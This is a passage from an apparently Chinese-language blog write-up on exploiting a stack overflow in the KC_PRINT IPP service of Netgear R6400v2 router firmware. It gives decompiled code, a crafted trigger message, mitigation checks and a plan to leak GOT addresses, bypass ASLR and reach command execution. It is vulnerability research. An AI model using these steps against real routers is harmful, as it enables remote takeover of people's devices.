class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !is_printer_connected(usblp_index) )     <span class="comment">// 检查是否有打印机设备挂载</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v22[<span class="number">1</span>] = usblp_index;</span><br><span class="line">HTTP_INPUT = <span class="built_in">strstr</span>(buf, <span class="string">&quot;Content-Length: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !HTTP_INPUT )</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line">HTTP_INPUT += <span class="number">16</span>;</span><br><span class="line">v18 = <span class="built_in">strstr</span>(HTTP_INPUT, <span class="string">&quot;\r\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v18 )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">v13 = *v18;</span><br><span class="line">*v18 = <span class="number">0</span>;</span><br><span class="line">content_len = atoi(HTTP_INPUT);</span><br><span class="line">*v18 = v13;</span><br><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( n != <span class="number">8</span> )</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> ( (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">2</span>) &amp;&amp; (recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">6</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v14 = do_airippWithContentLength(v22, content_len, recv_buf);</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先  <code>  n = recv_n(fd, buf, 1024);</code>  接收 1024 的消息，这一部分消息以  <code>\r\n</code> 作为结束标识， 然后会取出 <code>Content-Length: </code> 的值作为  <code>content_len</code> 传入 <code>do_airippWithContentLength</code> 函数中。</p><p>在调用 <code>do_airippWithContentLength</code>  函数之前， 还会读取一个 8 字节长度的消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recv_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recv_buf));</span><br><span class="line">n = recv(fd, recv_buf, <span class="number">8u</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>该 8 字节长度的消息有一定的格式， 当满足 <code>(recv_buf[2] || recv_buf[3] != 2) &amp;&amp; (recv_buf[2] || recv_buf[3] != 6)</code> 条件的时候才会调用 <code>do_airippWithContentLength</code> 函数。</p><p>且进入到 <code>do_airippWithContentLength </code>函数后， 会根据这个 8 个字节长度的消息， 来决定进一步调用哪个函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">do_airippWithContentLength</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">size_t</span> content_len, <span class="keyword">const</span> <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *recv_buf; <span class="comment">// [sp+18h] [bp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+1Ch] [bp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> Jobs; <span class="comment">// [sp+24h] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = *a1;</span><br><span class="line">  recv_buf = <span class="built_in">malloc</span>(content_len);</span><br><span class="line">  <span class="keyword">if</span> ( !recv_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>(recv_buf, buf, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( toRead(v8, (recv_buf + <span class="number">8</span>), content_len - <span class="number">8</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">11</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">9</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">10</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">if</span> ( recv_buf[<span class="number">2</span>] || recv_buf[<span class="number">3</span>] != <span class="number">5</span> )</span><br><span class="line">                Jobs = sub_D0C8(a1, recv_buf);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                Jobs = Response_Create_Job(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              Jobs = Response_Get_Jobs(a1, recv_buf, content_len);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            Jobs = Response_Get_Job_Attributes(a1, recv_buf, content_len);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Client %d: Cancel-Job\n&quot;</span>, v8);</span><br><span class="line">          Jobs = sub_10EA0(a1, recv_buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例如此处， 如果我们想调用 <code>Response_Get_Jobs</code> 函数， 我们就得进一步满足 <code> recv_buf[2] || recv_buf[3] == 10</code>  的条件， 才能进到 <code>Response_Get_Jobs</code> 函数里。因此我们可以构造如下的消息：</p><p><code>b&#39;\x00\x00\x00\x0a\x00\x00\x99\x99&#39;</code>  让其满足下标为 3 的时候 为 <code>10</code>  即可。 </p><p>另外， 在 <code>do_http</code> 函数中有一个 <code>  if ( !is_printer_connected(usblp_index) )     // 检查是否有打印机设备挂载</code> 的判断，该函数会读取 <code>/proc/printer_status</code> 的内容来判断是否有打印机挂载。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( printer_status )</span><br><span class="line">&#123;</span><br><span class="line">  fd = open(<span class="string">&quot;/proc/printer_status&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(printer_status, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">    v7 = read(fd, printer_status, <span class="number">0x400</span>u);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(printer_status + v7) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">      <span class="built_in">snprintf</span>(s, <span class="number">0x10</span>u, <span class="string">&quot;usblp%d&quot;</span>, usblp_index - <span class="number">1</span>);</span><br><span class="line">      v7 = <span class="built_in">strstr</span>(printer_status, s) != <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(printer_status);</span><br><span class="line">      printer_status = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> v7;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里我没有挂载打印机，因此我通过 gdb 来绕过这个判断。</p><p>此时已经进到 <code>do_airippWithContentLength</code> 函数，  该函数会进一步根据 <code>content-len - 8</code>  读取后续的更多消息内容。而这个 <code>content-len</code>  是没有进行长度检查的，这里以 <code>Response_Get_Jobs</code> 函数为例， 来做进一步的分析。</p><p>在 <code>Response_Get_Jobs</code> 中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag1 = <span class="number">0</span>;</span><br><span class="line"> prefix_size = <span class="number">0x4A</span>;</span><br><span class="line"> prefix_ptr = <span class="built_in">malloc</span>(<span class="number">0x4A</span>u);</span><br><span class="line"> <span class="keyword">if</span> ( !prefix_ptr )</span><br><span class="line"> &#123;</span><br><span class="line">   perror(<span class="string">&quot;Response_Get_Jobs: malloc xx&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="built_in">memset</span>(prefix_ptr, <span class="number">0</span>, prefix_size);</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">2u</span>);</span><br><span class="line"> total += cnt;</span><br><span class="line"> <span class="keyword">if</span> ( *recv_buf == <span class="number">1</span> &amp;&amp; !recv_buf[<span class="number">1</span>] )</span><br><span class="line">   flag1 = <span class="number">1</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> *(prefix_ptr + total++) = <span class="number">0</span>;</span><br><span class="line"> offset += <span class="number">2</span>;</span><br><span class="line"> total += memcpy_n(prefix_ptr, total, &amp;recv_buf[offset], <span class="number">4u</span>);</span><br><span class="line"> offset += <span class="number">4</span>;</span><br><span class="line"> v12 = <span class="number">66</span>;</span><br><span class="line"> cnt = memcpy_n(prefix_ptr, total, &amp;unk_1823C, <span class="number">0x42</span>u);</span><br><span class="line"> total += cnt;</span><br><span class="line"> ++offset;                                     <span class="comment">// offest == 09</span></span><br><span class="line"> <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="keyword">sizeof</span>(v9));</span><br><span class="line"> <span class="built_in">memset</span>(buf_2048, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf_2048));</span><br><span class="line"> buf_2048[subffix_offset++] = <span class="number">5</span>;</span><br><span class="line"> <span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       flag2 = <span class="number">1</span>;</span><br><span class="line">       buf_2048[subffix_offset++] = <span class="number">68</span>;</span><br><span class="line">       copy_len = (recv_buf[offset + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">2</span>];</span><br><span class="line">       cnt = memcpy_n(buf_2048, subffix_offset, &amp;recv_buf[offset + <span class="number">1</span>], copy_len + <span class="number">2</span>);</span><br><span class="line">       subffix_offset += cnt;</span><br><span class="line">     &#125;</span><br><span class="line">     ++offset;                                 <span class="comment">// offset=10</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span> + copy_len;                   <span class="comment">// offset 12</span></span><br><span class="line">     copy_len = (recv_buf[offset] &lt;&lt; <span class="number">8</span>) + recv_buf[offset + <span class="number">1</span>];</span><br><span class="line">     offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">     <span class="keyword">if</span> ( flag2 )</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">       <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">       <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br></pre></td></tr></table></figure><p>存在一个缓冲区溢出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( flag2 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br></pre></td></tr></table></figure><p>此处的 <code>copy_len</code>  是完全可控的， 且 <code>buf_2048</code>   在栈上， 我们只需让 <code>flag1</code>  不等于1 ， <code>flag2</code> 等于 1 ，就能进入到这个分支， 即满足  <code> *recv_buf == 1 &amp;&amp; !recv_buf[1]</code> 且 <code> recv_buf[offset] == 0x44</code> 条件即可。</p><h2 id="利用编写"><a href="#利用编写" class="headerlink" title="利用编写"></a>利用编写</h2><p>该程序保护都没有开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/workhub/Dropbox/Attachments/IoT and BaseBand/Router/Netgear/R6400v2/fs/squashfs-root/usr/bin/KC_PRINT&#x27;</span></span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>既没有 <code>canary</code>  也没有 <code>PIE</code> ， 这极大的方便了我们的漏洞利用。  </p><p>系统随机化开启情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p><code>ASLR</code> 等级为 1， 即栈和共享库是完全随机的， 但是堆的分配不随机。</p><p>我们的目的是通过这个栈溢出漏洞， 来达到任意命令执行的目的。我们检索这个程序，发现程序里并没有现成的 <code>system</code> 或者 <code>popen</code> 函数，因此 <code>ret2system</code> 的方法并不能直接使用， 因此我们需要绕过随机化，需要泄漏 <code>uclibc</code> 中的 <code>system</code> 地址， 因此首先需要一个信息泄漏的方法，来 leak <code>uclibc </code> 的加载基址。</p><h3 id="Bypass-ASLR"><a href="#Bypass-ASLR" class="headerlink" title="Bypass ASLR"></a>Bypass ASLR</h3><p>其实一般这种思路， 我们可以通过 ROP ， 调用 <code>write</code> 等函数读取  <code>got</code> 表中的值来做 <code>uclibc </code>的地址。 但是这个方法我们可能需要知道我们当前链接的 <code>fd</code> 。如果不知道 <code>fd</code> ， 我们可能需要爆破这个， 但由于这个程序是多线程而不是父子进程的形式， 如果失败可能会造成 crash。 </p><p>进一步分析函数， 以及阅读 slide  ，我们发现程序中有一个可以做任意地址读写的方法。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-763f460331a41355beb24dcb1b383c47-159298.png"></a></p><p>我们可以通过栈溢出， 来覆盖 <code>prefix_ptr</code>  和 <code>prefix_size </code> 通过控制这两个变量，我们就可以通 <code>write_ipp_response</code>  将我们想读取的内容发送回来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> command[<span class="number">64</span>]; <span class="comment">// [sp+24h] [bp-1090h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> buf_2048[<span class="number">2048</span>]; <span class="comment">// [sp+64h] [bp-1050h] BYREF</span></span><br><span class="line"><span class="keyword">char</span> v9[<span class="number">2048</span>]; <span class="comment">// [sp+864h] [bp-850h] BYREF</span></span><br><span class="line"><span class="keyword">int</span> v10; <span class="comment">// [sp+1064h] [bp-50h]</span></span><br><span class="line"><span class="keyword">size_t</span> copy_len; <span class="comment">// [sp+1068h] [bp-4Ch]</span></span><br><span class="line"><span class="keyword">int</span> v12; <span class="comment">// [sp+106Ch] [bp-48h]</span></span><br><span class="line"><span class="keyword">size_t</span> cnt; <span class="comment">// [sp+1070h] [bp-44h]</span></span><br><span class="line"><span class="keyword">size_t</span> prefix_size; <span class="comment">// [sp+1074h] [bp-40h]</span></span><br><span class="line"><span class="keyword">int</span> total; <span class="comment">// [sp+1078h] [bp-3Ch]</span></span><br><span class="line"><span class="keyword">void</span> *prefix_ptr; <span class="comment">// [sp+107Ch] [bp-38h]</span></span><br><span class="line"><span class="keyword">int</span> v17; <span class="comment">// [sp+1080h] [bp-34h]</span></span><br><span class="line"><span class="keyword">int</span> client_sock; <span class="comment">// [sp+1084h] [bp-30h]</span></span><br><span class="line"><span class="keyword">int</span> v19; <span class="comment">// [sp+1088h] [bp-2Ch]</span></span><br><span class="line"><span class="keyword">int</span> v20; <span class="comment">// [sp+108Ch] [bp-28h]</span></span><br><span class="line"><span class="keyword">char</span> flag1; <span class="comment">// [sp+1093h] [bp-21h]</span></span><br><span class="line"><span class="keyword">char</span> v22; <span class="comment">// [sp+1094h] [bp-20h]</span></span><br><span class="line"><span class="keyword">char</span> job_state_resons; <span class="comment">// [sp+1095h] [bp-1Fh]</span></span><br><span class="line"><span class="keyword">char</span> job_state; <span class="comment">// [sp+1096h] [bp-1Eh]</span></span><br><span class="line"><span class="keyword">char</span> job_originating_user_name; <span class="comment">// [sp+1097h] [bp-1Dh]</span></span><br><span class="line"><span class="keyword">char</span> job_name; <span class="comment">// [sp+1098h] [bp-1Ch]</span></span><br><span class="line"><span class="keyword">char</span> job_id; <span class="comment">// [sp+1099h] [bp-1Bh]</span></span><br><span class="line"><span class="keyword">char</span> v28; <span class="comment">// [sp+109Ah] [bp-1Ah]</span></span><br><span class="line"><span class="keyword">char</span> flag2; <span class="comment">// [sp+109Bh] [bp-19h]</span></span><br><span class="line"><span class="keyword">size_t</span> final_size; <span class="comment">// [sp+109Ch] [bp-18h]</span></span><br><span class="line"><span class="keyword">int</span> offset; <span class="comment">// [sp+10A0h] [bp-14h]</span></span><br><span class="line"><span class="keyword">size_t</span> response_len; <span class="comment">// [sp+10A4h] [bp-10h]</span></span><br><span class="line"><span class="keyword">void</span> *final_ptr; <span class="comment">// [sp+10A8h] [bp-Ch]</span></span><br><span class="line"><span class="keyword">size_t</span> subffix_offset; <span class="comment">// [sp+10ACh] [bp-8h]</span></span><br></pre></td></tr></table></figure><p>最首先的想法肯定是通过覆盖 <code>prefix_ptr</code> 指向 <code>.got</code>  来做读写， 但是如果我们直接的指向了函数的 <code>.got</code>  , 例如 <code>strcpy_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span></span><br></pre></td></tr></table></figure><p>但是在调用 <code>write_ipp_response</code> 后， 程序会 <code>free(prefix_ptr);</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line"><span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">  prefix_ptr = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果是直接控制  <code>prefix_ptr == 000180F0</code> ， 在 <code>free</code> 的过程中会造成崩溃。 最后我们发现当把 <code>prefix_ptr </code> 指向 <code>.got</code>  的开头</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.got:<span class="number">000180E4</span>                                         ; sub_8C0C+<span class="number">8</span>↑o ...</span><br><span class="line">.got:<span class="number">000180E8</span>                 DCD <span class="number">0</span></span><br><span class="line">.got:<span class="number">000180</span>EC off_180EC       DCD <span class="number">0</span>                   ; DATA XREF: sub_8C0C+C↑r</span><br><span class="line">.got:<span class="number">000180F</span>0 strcpy_ptr      DCD __imp_strcpy        ; DATA XREF: <span class="built_in">strcpy</span>+<span class="number">8</span>↑r</span><br></pre></td></tr></table></figure><p>即将 <code>prefix_ptr</code> 指向  <code>000180E4</code>  是不会崩溃的。</p><blockquote><p>这里和 小伙伴  @aobo @leomxxj 讨论来下 ， 猜测应该是如果是 free(0x000180EC) ， 当 uclibc 会对  libc 的地址写， 造成 crash<br>如果 free(0x00180E4) </p><p>pwndbg&gt; telescope 0x000180E4<br>    00:0000│  0x180e4 —▸ 0x1800c ◂— 0x1<br>    01:0004│  0x180e8 —▸ 0x40024030 ◂— 0x0<br>pwndbg&gt; vmmap 0x1800c<br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br> 0x18000    0x19000 rw-p     1000 10000  /usr/bin/KC_PRINT +0xc<br>0x1800c 地址是可读写的</p></blockquote><p>另外在编写这部分 exploit 的时候， 我们发现处理 <code>recv_buf</code> 消息的时候</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !flag1 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">while</span> ( recv_buf[offset] != <span class="number">3</span> &amp;&amp; offset &lt;= content_len )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> ( recv_buf[offset] == <span class="number">0x44</span> &amp;&amp; !flag2 )</span><br><span class="line">     &#123;</span><br></pre></td></tr></table></figure><p>这部分是一个 <code>while</code> 循环，只有当消息为 <code>\x03</code> 的时候， 才会结束循环， 因此我们需要 <code>offset</code>  设置好， </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    offset += copy_len;</span><br><span class="line">.text:<span class="number">00010</span>A30                 LDR             R2, [R11,<span class="meta">#offset]</span></span><br><span class="line">.text:<span class="number">00010</span>A34                 LDR             R3, [R11,#copy_len]</span><br><span class="line">.text:<span class="number">00010</span>A38                 ADD             R3, R2, R3</span><br><span class="line">.text:<span class="number">00010</span>A3C                 STR             R3, [R11,#<span class="number">-0x14</span>]</span><br></pre></td></tr></table></figure><p>结束循环到 <code>write_ipp_response</code> 函数之前 ，我们还需要过两个地方， 第一个处， 为了方便我们在 <code>command</code>  前设置一个 <code>job-id</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">    offset += <span class="number">2</span>;                              <span class="comment">// offset 14</span></span><br><span class="line">    <span class="keyword">if</span> ( flag2 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">      <span class="built_in">memcpy</span>(command, &amp;recv_buf[offset], copy_len);</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-media-sheets-completed&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        v22 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-state-reasons&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_state_resons = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_name = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(command, <span class="string">&quot;job-originating-user-name&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        job_originating_user_name = 